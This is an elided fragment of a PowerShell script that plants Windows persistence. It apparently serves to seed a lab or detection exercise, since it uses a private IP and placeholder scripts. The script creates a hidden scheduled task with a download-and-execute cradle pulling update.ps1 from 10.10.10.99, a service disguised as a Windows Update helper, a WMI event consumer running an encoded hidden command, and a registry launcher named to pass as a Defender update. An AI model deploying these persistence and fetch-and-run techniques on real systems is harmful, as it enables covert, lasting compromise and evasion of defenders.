...
$taskAction = New-ScheduledTaskAction `
 ...
 -Argument "-WindowStyle Hidden -ep bypass -c `"IEX (New-Object
Net.WebClient).DownloadString('http://10.10.10.99/update.ps1')`""
...
# --- 3. Malicious Service ---
$servicePath = "C:\Windows\System32\svchost.exe -k netsvcs -p -s UpdateHelper"
...
sc.exe create "UpdateHelperSvc" binPath= "cmd.exe /c powershell -ep bypass -file C:
\Windows\Temp\sync.ps1" start= auto DisplayName= "Windows Update Helper Service"
# Create the fake script it references
...
ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
...
$consumerPath = Set-WmiInstance -Namespace root\subscription -Class
CommandLineEventConsumer `
 -Arguments @{
 Name = $consumerName
 CommandLineTemplate = "powershell.exe -ep bypass -WindowStyle Hidden -c `"IEX([Syste
m.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGluZyAxMC4xMC4x
MC45OQ==')))`""
 }
...
New-ItemProperty `
 ...
 -Value "powershell.exe -WindowStyle Hidden -ep bypass -file C:
\ProgramData\Microsoft\defender-update.ps1" `
 -PropertyType String -Force
New-Item -Path "C:\ProgramData\Microsoft" -ItemType Directory -Force -ErrorAction
SilentlyContinue
Set-Content -Path "C:\ProgramData\Microsoft\defender-update.ps1" -Value "# callback
placeholder"
# --- 6. Rogue GPO ---
